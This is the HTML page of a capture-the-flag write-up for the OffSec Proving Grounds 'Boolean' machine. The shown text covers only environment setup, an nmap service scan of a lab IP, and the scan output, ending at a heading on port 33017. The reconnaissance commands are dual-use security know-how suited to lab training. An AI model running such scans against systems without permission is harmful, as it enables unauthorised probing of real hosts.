@@ -1,0 +1,300 @@
+<!DOCTYPE html>
+<html lang="en"><head><title>Boolean - Cameron Candau</title><meta charset="utf-8"/><link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com"/><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source Sans 3:wght@400;700&amp;family=Source Sans 3:ital,wght@0,400;0,600;1,400;1,600&amp;family=IBM Plex Mono:wght@400;600&amp;display=swap"/><link rel="preconnect" href="https://cdnjs.cloudflare.com" crossorigin="anonymous"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="og:site_name" content="/CTF"/><meta property="og:title" content="Boolean - Cameron Candau"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:title" content="Boolean - Cameron Candau"/><meta name="twitter:description" content="Difficulty: Intermediate Environment Setup export IP=192.168.126.231 export URL=http://$IP Service Enumeration (v-scan.sh) nmap --privileged -sC -sV -T4 -Pn -p22,80,33017 -oA full_tcp $IP PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 ..."/><meta property="og:description" content="Difficulty: Intermediate Environment Setup export IP=192.168.126.231 export URL=http://$IP Service Enumeration (v-scan.sh) nmap --privileged -sC -sV -T4 -Pn -p22,80,33017 -oA full_tcp $IP PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 ..."/><meta property="og:image:alt" content="Difficulty: Intermediate Environment Setup export IP=192.168.126.231 export URL=http://$IP Service Enumeration (v-scan.sh) nmap --privileged -sC -sV -T4 -Pn -p22,80,33017 -oA full_tcp $IP PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 ..."/><meta property="og:image" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta property="og:image:url" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta name="twitter:image" content="https://cameroncandau.com/ctf/static/og-image.png"/><meta property="og:image:type" content="image/.png"/><meta property="twitter:domain" content="cameroncandau.com/ctf"/><meta property="og:url" content="https://cameroncandau.com/ctf/Archive/OFFSEC---Proving-Grounds-Writeups/Linux/Boolean"/><meta property="twitter:url" content="https://cameroncandau.com/ctf/Archive/OFFSEC---Proving-Grounds-Writeups/Linux/Boolean"/><link rel="icon" type="image/svg+xml" href="/favicon.svg"/><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"/><link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"/><link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"/><link rel="manifest" href="/site.webmanifest"/><meta name="description" content="Difficulty: Intermediate Environment Setup export IP=192.168.126.231 export URL=http://$IP Service Enumeration (v-scan.sh) nmap --privileged -sC -sV -T4 -Pn -p22,80,33017 -oA full_tcp $IP PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 ..."/><meta name="generator" content="Quartz"/><link href="../../../index.css" rel="stylesheet" type="text/css" spa-preserve/><style>.expand-button {
+  position: absolute;
+  display: flex;
+  float: right;
+  padding: 0.4rem;
+  margin: 0.3rem;
+  right: 0;
+  color: var(--gray);
+  border-color: var(--dark);
+  background-color: var(--light);
+  border: 1px solid;
+  border-radius: 5px;
+  opacity: 0;
+  transition: 0.2s;
+}
+.expand-button > svg {
+  fill: var(--light);
+  filter: contrast(0.3);
+}
+.expand-button:hover {
+  cursor: pointer;
+  border-color: var(--secondary);
+}
+.expand-button:focus {
+  outline: 0;
+}
+
+pre:hover > .expand-button {
+  opacity: 1;
+  transition: 0.2s;
+}
+
+#mermaid-container {
+  position: fixed;
+  contain: layout;
+  z-index: 999;
+  left: 0;
+  top: 0;
+  width: 100vw;
+  height: 100vh;
+  overflow: hidden;
+  display: none;
+  backdrop-filter: blur(4px);
+  background: rgba(0, 0, 0, 0.5);
+}
+#mermaid-container.active {
+  display: inline-block;
+}
+#mermaid-container > #mermaid-space {
+  border: 1px solid var(--lightgray);
+  background-color: var(--light);
+  border-radius: 5px;
+  position: fixed;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  height: 80vh;
+  width: 80vw;
+  overflow: hidden;
+}
+#mermaid-container > #mermaid-space > .mermaid-content {
+  padding: 2rem;
+  position: relative;
+  transform-origin: 0 0;
+  transition: transform 0.1s ease;
+  overflow: visible;
+  min-height: 200px;
+  min-width: 200px;
+}
+#mermaid-container > #mermaid-space > .mermaid-content pre {
+  margin: 0;
+  border: none;
+}
+#mermaid-container > #mermaid-space > .mermaid-content svg {
+  max-width: none;
+  height: auto;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls {
+  position: absolute;
+  bottom: 20px;
+  right: 20px;
+  display: flex;
+  gap: 8px;
+  padding: 8px;
+  background: var(--light);
+  border: 1px solid var(--lightgray);
+  border-radius: 6px;
+  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+  z-index: 2;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+  height: 32px;
+  padding: 0;
+  border: 1px solid var(--lightgray);
+  background: var(--light);
+  color: var(--dark);
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  font-family: var(--bodyFont);
+  transition: all 0.2s ease;
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:hover {
+  background: var(--lightgray);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:active {
+  transform: translateY(1px);
+}
+#mermaid-container > #mermaid-space > .mermaid-controls .mermaid-control-button:nth-child(2) {
+  width: auto;
+  padding: 0 12px;
+  font-size: 14px;
+}
+/*# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VSb290IjoiL2hvbWUvcnVubmVyL3dvcmsvcGVyc29uYWwtd2Vic2l0ZS9wZXJzb25hbC13ZWJzaXRlL2N0Zi1xdWFydHovcXVhcnR6L2NvbXBvbmVudHMvc3R5bGVzIiwic291cmNlcyI6WyJtZXJtYWlkLmlubGluZS5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBOztBQUdGO0VBQ0U7RUFDQTs7QUFHRjtFQUNFOzs7QUFLRjtFQUNFO0VBQ0E7OztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFOztBQUdGO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7O0FBR0Y7RUFDRTtFQUNBOztBQUlKO0VBQ0U7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTs7QUFFQTtFQUNFO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7RUFDQTtFQUNBO0VBQ0E7O0FBRUE7RUFDRTs7QUFHRjtFQUNFOztBQUlGO0VBQ0U7RUFDQTtFQUNBIiwic291cmNlc0NvbnRlbnQiOlsiLmV4cGFuZC1idXR0b24ge1xuICBwb3NpdGlvbjogYWJzb2x1dGU7XG4gIGRpc3BsYXk6IGZsZXg7XG4gIGZsb2F0OiByaWdodDtcbiAgcGFkZGluZzogMC40cmVtO1xuICBtYXJnaW46IDAuM3JlbTtcbiAgcmlnaHQ6IDA7IC8vIE5PVEU6IHJpZ2h0IHdpbGwgYmUgc2V0IGluIG1lcm1haWQuaW5saW5lLnRzXG4gIGNvbG9yOiB2YXIoLS1ncmF5KTtcbiAgYm9yZGVyLWNvbG9yOiB2YXIoLS1kYXJrKTtcbiAgYmFja2dyb3VuZC1jb2xvcjogdmFyKC0tbGlnaHQpO1xuICBib3JkZXI6IDFweCBzb2xpZDtcbiAgYm9yZGVyLXJhZGl1czogNXB4O1xuICBvcGFjaXR5OiAwO1xuICB0cmFuc2l0aW9uOiAwLjJzO1xuXG4gICYgPiBzdmcge1xuICAgIGZpbGw6IHZhcigtLWxpZ2h0KTtcbiAgICBmaWx0ZXI6IGNvbnRyYXN0KDAuMyk7XG4gIH1cblxuICAmOmhvdmVyIHtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG4gICAgYm9yZGVyLWNvbG9yOiB2YXIoLS1zZWNvbmRhcnkpO1xuICB9XG5cbiAgJjpmb2N1cyB7XG4gICAgb3V0bGluZTogMDtcbiAgfVxufVxuXG5wcmUge1xuICAmOmhvdmVyID4gLmV4cGFuZC1idXR0b24ge1xuICAgIG9wYWNpdHk6IDE7XG4gICAgdHJhbnNpdGlvbjogMC4ycztcbiAgfVxufVxuXG4jbWVybWFpZC1jb250YWluZXIge1xuICBwb3NpdGlvbjogZml4ZWQ7XG4gIGNvbnRhaW46IGxheW91dDtcbiAgei1pbmRleDogOTk5O1xuICBsZWZ0OiAwO1xuICB0b3A6IDA7XG4gIHdpZHRoOiAxMDB2dztcbiAgaGVpZ2h0OiAxMDB2aDtcbiAgb3ZlcmZsb3c6IGhpZGRlbjtcbiAgZGlzcGxheTogbm9uZTtcbiAgYmFja2Ryb3AtZmlsdGVyOiBibHVyKDRweCk7XG4gIGJhY2tncm91bmQ6IHJnYmEoMCwgMCwgMCwgMC41KTtcblxuICAmLmFjdGl2ZSB7XG4gICAgZGlzcGxheTogaW5saW5lLWJsb2NrO1xuICB9XG5cbiAgJiA+ICNtZXJtYWlkLXNwYWNlIHtcbiAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgIGJhY2tncm91bmQtY29sb3I6IHZhcigtLWxpZ2h0KTtcbiAgICBib3JkZXItcmFkaXVzOiA1cHg7XG4gICAgcG9zaXRpb246IGZpeGVkO1xuICAgIHRvcDogNTAlO1xuICAgIGxlZnQ6IDUwJTtcbiAgICB0cmFuc2Zvcm06IHRyYW5zbGF0ZSgtNTAlLCAtNTAlKTtcbiAgICBoZWlnaHQ6IDgwdmg7XG4gICAgd2lkdGg6IDgwdnc7XG4gICAgb3ZlcmZsb3c6IGhpZGRlbjtcblxuICAgICYgPiAubWVybWFpZC1jb250ZW50IHtcbiAgICAgIHBhZGRpbmc6IDJyZW07XG4gICAgICBwb3NpdGlvbjogcmVsYXRpdmU7XG4gICAgICB0cmFuc2Zvcm0tb3JpZ2luOiAwIDA7XG4gICAgICB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4xcyBlYXNlO1xuICAgICAgb3ZlcmZsb3c6IHZpc2libGU7XG4gICAgICBtaW4taGVpZ2h0OiAyMDBweDtcbiAgICAgIG1pbi13aWR0aDogMjAwcHg7XG5cbiAgICAgIHByZSB7XG4gICAgICAgIG1hcmdpbjogMDtcbiAgICAgICAgYm9yZGVyOiBub25lO1xuICAgICAgfVxuXG4gICAgICBzdmcge1xuICAgICAgICBtYXgtd2lkdGg6IG5vbmU7XG4gICAgICAgIGhlaWdodDogYXV0bztcbiAgICAgIH1cbiAgICB9XG5cbiAgICAmID4gLm1lcm1haWQtY29udHJvbHMge1xuICAgICAgcG9zaXRpb246IGFic29sdXRlO1xuICAgICAgYm90dG9tOiAyMHB4O1xuICAgICAgcmlnaHQ6IDIwcHg7XG4gICAgICBkaXNwbGF5OiBmbGV4O1xuICAgICAgZ2FwOiA4cHg7XG4gICAgICBwYWRkaW5nOiA4cHg7XG4gICAgICBiYWNrZ3JvdW5kOiB2YXIoLS1saWdodCk7XG4gICAgICBib3JkZXI6IDFweCBzb2xpZCB2YXIoLS1saWdodGdyYXkpO1xuICAgICAgYm9yZGVyLXJhZGl1czogNnB4O1xuICAgICAgYm94LXNoYWRvdzogMCAycHggNHB4IHJnYmEoMCwgMCwgMCwgMC4xKTtcbiAgICAgIHotaW5kZXg6IDI7XG5cbiAgICAgIC5tZXJtYWlkLWNvbnRyb2wtYnV0dG9uIHtcbiAgICAgICAgZGlzcGxheTogZmxleDtcbiAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG4gICAgICAgIHdpZHRoOiAzMnB4O1xuICAgICAgICBoZWlnaHQ6IDMycHg7XG4gICAgICAgIHBhZGRpbmc6IDA7XG4gICAgICAgIGJvcmRlcjogMXB4IHNvbGlkIHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0KTtcbiAgICAgICAgY29sb3I6IHZhcigtLWRhcmspO1xuICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7XG4gICAgICAgIGN1cnNvcjogcG9pbnRlcjtcbiAgICAgICAgZm9udC1zaXplOiAxNnB4O1xuICAgICAgICBmb250LWZhbWlseTogdmFyKC0tYm9keUZvbnQpO1xuICAgICAgICB0cmFuc2l0aW9uOiBhbGwgMC4ycyBlYXNlO1xuXG4gICAgICAgICY6aG92ZXIge1xuICAgICAgICAgIGJhY2tncm91bmQ6IHZhcigtLWxpZ2h0Z3JheSk7XG4gICAgICAgIH1cblxuICAgICAgICAmOmFjdGl2ZSB7XG4gICAgICAgICAgdHJhbnNmb3JtOiB0cmFuc2xhdGVZKDFweCk7XG4gICAgICAgIH1cblxuICAgICAgICAvLyBTdHlsZSB0aGUgcmVzZXQgYnV0dG9uIGRpZmZlcmVudGx5XG4gICAgICAgICY6bnRoLWNoaWxkKDIpIHtcbiAgICAgICAgICB3aWR0aDogYXV0bztcbiAgICAgICAgICBwYWRkaW5nOiAwIDEycHg7XG4gICAgICAgICAgZm9udC1zaXplOiAxNHB4O1xuICAgICAgICB9XG4gICAgICB9XG4gICAgfVxuICB9XG59XG4iXX0= */</style><link href="https://cdn.jsdelivr.net/npm/katex@0.16.11/dist/katex.min.css" rel="stylesheet" type="text/css" spa-preserve/><script src="../../../prescript.js" type="application/javascript" spa-preserve></script><script type="application/javascript" spa-preserve>const fetchData = fetch("../../../static/contentIndex.json").then(data => data.json())</script><link rel="alternate" type="application/rss+xml" title="RSS Feed" href="https://cameroncandau.com/ctf/index.xml"/></head><body data-slug="Archive/OFFSEC---Proving-Grounds-Writeups/Linux/Boolean"><div id="quartz-root" class="page"><div id="quartz-body"><div class="left sidebar"><div class="page-title"><a class="page-title__parent" href="/" data-router-ignore="true">Back to CameronCandau.com</a><h2 class="page-title__home"><a href="../../..">/CTF</a></h2></div><div class="spacer mobile-only"></div><div style="display: flex; flex-direction: row; flex-wrap: nowrap; gap: 1rem;"><div style="flex-grow: 1; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><div class="search"><button class="search-button"><p>Search</p><svg role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title>Search</title><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"></path><circle cx="8" cy="8" r="7"></circle></g></svg></button><div class="search-container"><div class="search-space"><input autocomplete="off" class="search-bar" name="search" type="text" aria-label="Search for something" placeholder="Search for something"/><div class="search-layout" data-preview="true"></div></div></div></div></div><div style="flex-grow: 0; flex-shrink: 1; flex-basis: auto; order: 0; align-self: center; justify-self: center;"><button class="darkmode"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="dayIcon" x="0px" y="0px" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35" xml:space="preserve" aria-label="Dark mode"><title>Dark mode</title><path d="M6,17.5C6,16.672,5.328,16,4.5,16h-3C0.672,16,0,16.672,0,17.5    S0.672,19,1.5,19h3C5.328,19,6,18.328,6,17.5z M7.5,26c-0.414,0-0.789,0.168-1.061,0.439l-2,2C4.168,28.711,4,29.086,4,29.5    C4,30.328,4.671,31,5.5,31c0.414,0,0.789-0.168,1.06-0.44l2-2C8.832,28.289,9,27.914,9,27.5C9,26.672,8.329,26,7.5,26z M17.5,6    C18.329,6,19,5.328,19,4.5v-3C19,0.672,18.329,0,17.5,0S16,0.672,16,1.5v3C16,5.328,16.671,6,17.5,6z M27.5,9    c0.414,0,0.789-0.168,1.06-0.439l2-2C30.832,6.289,31,5.914,31,5.5C31,4.672,30.329,4,29.5,4c-0.414,0-0.789,0.168-1.061,0.44    l-2,2C26.168,6.711,26,7.086,26,7.5C26,8.328,26.671,9,27.5,9z M6.439,8.561C6.711,8.832,7.086,9,7.5,9C8.328,9,9,8.328,9,7.5    c0-0.414-0.168-0.789-0.439-1.061l-2-2C6.289,4.168,5.914,4,5.5,4C4.672,4,4,4.672,4,5.5c0,0.414,0.168,0.789,0.439,1.06    L6.439,8.561z M33.5,16h-3c-0.828,0-1.5,0.672-1.5,1.5s0.672,1.5,1.5,1.5h3c0.828,0,1.5-0.672,1.5-1.5S34.328,16,33.5,16z     M28.561,26.439C28.289,26.168,27.914,26,27.5,26c-0.828,0-1.5,0.672-1.5,1.5c0,0.414,0.168,0.789,0.439,1.06l2,2    C28.711,30.832,29.086,31,29.5,31c0.828,0,1.5-0.672,1.5-1.5c0-0.414-0.168-0.789-0.439-1.061L28.561,26.439z M17.5,29    c-0.829,0-1.5,0.672-1.5,1.5v3c0,0.828,0.671,1.5,1.5,1.5s1.5-0.672,1.5-1.5v-3C19,29.672,18.329,29,17.5,29z M17.5,7    C11.71,7,7,11.71,7,17.5S11.71,28,17.5,28S28,23.29,28,17.5S23.29,7,17.5,7z M17.5,25c-4.136,0-7.5-3.364-7.5-7.5    c0-4.136,3.364-7.5,7.5-7.5c4.136,0,7.5,3.364,7.5,7.5C25,21.636,21.636,25,17.5,25z"></path></svg><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" class="nightIcon" x="0px" y="0px" viewBox="0 0 100 100" style="enable-background:new 0 0 100 100" xml:space="preserve" aria-label="Light mode"><title>Light mode</title><path d="M96.76,66.458c-0.853-0.852-2.15-1.064-3.23-0.534c-6.063,2.991-12.858,4.571-19.655,4.571  C62.022,70.495,50.88,65.88,42.5,57.5C29.043,44.043,25.658,23.536,34.076,6.47c0.532-1.08,0.318-2.379-0.534-3.23  c-0.851-0.852-2.15-1.064-3.23-0.534c-4.918,2.427-9.375,5.619-13.246,9.491c-9.447,9.447-14.65,22.008-14.65,35.369  c0,13.36,5.203,25.921,14.65,35.368s22.008,14.65,35.368,14.65c13.361,0,25.921-5.203,35.369-14.65  c3.872-3.871,7.064-8.328,9.491-13.246C97.826,68.608,97.611,67.309,96.76,66.458z"></path></svg></button></div></div><div class="explorer" data-behavior="link" data-collapsed="collapsed" data-savestate="true" data-data-fns="{&quot;order&quot;:[&quot;filter&quot;,&quot;map&quot;,&quot;sort&quot;],&quot;sortFn&quot;:&quot;(a,b)=>!a.isFolder&amp;&amp;!b.isFolder||a.isFolder&amp;&amp;b.isFolder?a.displayName.localeCompare(b.displayName,void 0,{numeric:!0,sensitivity:\&quot;base\&quot;}):!a.isFolder&amp;&amp;b.isFolder?1:-1&quot;,&quot;filterFn&quot;:&quot;node=>node.slugSegment!==\&quot;tags\&quot;&quot;,&quot;mapFn&quot;:&quot;node=>node&quot;}"><button type="button" class="explorer-toggle mobile-explorer hide-until-loaded" data-mobile="true" aria-controls="explorer-content"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide-menu"><line x1="4" x2="20" y1="12" y2="12"></line><line x1="4" x2="20" y1="6" y2="6"></line><line x1="4" x2="20" y1="18" y2="18"></line></svg></button><button type="button" class="title-button explorer-toggle desktop-explorer" data-mobile="false" aria-expanded="true"><h2>Explorer</h2><svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="fold"><polyline points="6 9 12 15 18 9"></polyline></svg></button><div class="explorer-content" aria-expanded="false"><ul class="explorer-ul overflow" id="ktgm2w"><li class="overflow-end"></li></ul></div><template id="template-file"><li><a href="#"></a></li></template><template id="template-folder"><li><div class="folder-container"><svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="5 8 14 8" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="folder-icon"><polyline points="6 9 12 15 18 9"></polyline></svg><div><button class="folder-button"><span class="folder-title"></span></button></div></div><div class="folder-outer"><ul class="content"></ul></div></li></template></div></div><div class="center"><div class="page-header"><div class="popover-hint"><nav class="breadcrumb-container" aria-label="breadcrumbs"><div class="breadcrumb-element"><a href="../../../">Home</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/">Archive</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/OFFSEC---Proving-Grounds-Writeups/">OFFSEC   Proving Grounds Writeups</a><p> ❯ </p></div><div class="breadcrumb-element"><a href="../../../Archive/OFFSEC---Proving-Grounds-Writeups/Linux/">Linux</a><p> ❯ </p></div><div class="breadcrumb-element"><a href>Boolean</a></div></nav><h1 class="article-title">Boolean</h1><p show-comma="true" class="content-meta"><time datetime="2026-06-23T06:24:22.969Z">Jun 23, 2026</time><span>5 min read</span></p><ul class="tags"><li><a href="../../../tags/Linux" class="internal tag-link">Linux</a></li><li><a href="../../../tags/LFI" class="internal tag-link">LFI</a></li></ul></div></div><article class="popover-hint"><p>Difficulty: Intermediate</p>
+<h1 id="environment-setup">Environment Setup<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#environment-setup" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p><code>export IP=192.168.126.231</code>
+<code>export URL=http://$IP</code></p>
+<h1 id="service-enumeration">Service Enumeration<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#service-enumeration" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h1>
+<p>(<a href="https://github.com/CameronCandau/OSCP-Automation/blob/main/bin/v-scan.sh" class="external">v-scan.sh<svg aria-hidden="true" class="external-icon" style="max-width:0.8em;max-height:0.8em;" viewBox="0 0 512 512"><path d="M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z"></path></svg></a>)</p>
+<p><code>nmap --privileged -sC -sV -T4 -Pn -p22,80,33017 -oA full_tcp $IP</code></p>
+<pre><code>PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
+| ssh-hostkey:
+|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
+|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
+|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
+80/tcp    open  http
+| http-title: Boolean
+|_Requested resource was http://192.168.126.231/login
+| fingerprint-strings:
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns:
+|     HTTP/1.1 400 Bad Request
+|   FourOhFourRequest, GetRequest, HTTPOptions:
+|     HTTP/1.0 403 Forbidden
+|     Content-Type: text/html; charset=UTF-8
+|_    Content-Length: 0
+33017/tcp open  http    Apache httpd 2.4.38 ((Debian))
+|_http-server-header: Apache/2.4.38 (Debian)
+|_http-title: Development
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.95%I=7%D=7/14%Time=68759C35%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,55,&quot;HTTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;
+SF:\x20charset=UTF-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(HTTPOptions,55,&quot;H
+SF:TTP/1\.0\x20403\x20Forbidden\r\nContent-Type:\x20text/html;\x20charset=
+SF:UTF-8\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,1C,&quot;HTTP/1\.1\x20
+SF:400\x20Bad\x20Request\r\n\r\n&quot;)%r(X11Probe,1C,&quot;HTTP/1\.1\x20400\x20Bad\
+SF:x20Request\r\n\r\n&quot;)%r(FourOhFourRequest,55,&quot;HTTP/1\.0\x20403\x20Forbid
+SF:den\r\nContent-Type:\x20text/html;\x20charset=UTF-8\r\nContent-Length:\
+SF:x200\r\n\r\n&quot;)%r(GenericLines,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\
+SF:n\r\n&quot;)%r(RPCCheck,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(D
+SF:NSVersionBindReqTCP,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(
+SF:DNSStatusRequestTCP,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(
+SF:Help,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(SSLSessionReq,1
+SF:C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(TerminalServerCookie,
+SF:1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(TLSSessionReq,1C,&quot;HT
+SF:TP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(Kerberos,1C,&quot;HTTP/1\.1\x20
+SF:400\x20Bad\x20Request\r\n\r\n&quot;)%r(SMBProgNeg,1C,&quot;HTTP/1\.1\x20400\x20Ba
+SF:d\x20Request\r\n\r\n&quot;)%r(LPDString,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Reque
+SF:st\r\n\r\n&quot;)%r(LDAPSearchReq,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n
+SF:\r\n&quot;)%r(LDAPBindReq,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r
+SF:(SIPOptions,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(LANDesk-
+SF:RC,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(TerminalServer,1C
+SF:,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(NCP,1C,&quot;HTTP/1\.1\x204
+SF:00\x20Bad\x20Request\r\n\r\n&quot;)%r(NotesRPC,1C,&quot;HTTP/1\.1\x20400\x20Bad\x
+SF:20Request\r\n\r\n&quot;)%r(JavaRMI,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\
+SF:n\r\n&quot;)%r(WMSRequest,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r
+SF:(oracle-tns,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(ms-sql-s
+SF:,1C,&quot;HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n&quot;)%r(afp,1C,&quot;HTTP/1\.1\x
+SF:20400\x20Bad\x20Request\r\n\r\n&quot;)%r(giop,1C,&quot;HTTP/1\.1\x20400\x20Bad\x2
+SF:0Request\r\n\r\n&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<h2 id="port-33017---http-not-needed">Port 33017 - HTTP (Not needed)<a role="anchor" aria-hidden="true" tabindex="-1" data-no-popover="true" href="#port-33017---http-not-needed" class="internal"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a></h2>
+<p><img src="../../../attachments/Pasted-image-20250714173355.png" width="auto" height="auto" alt/>
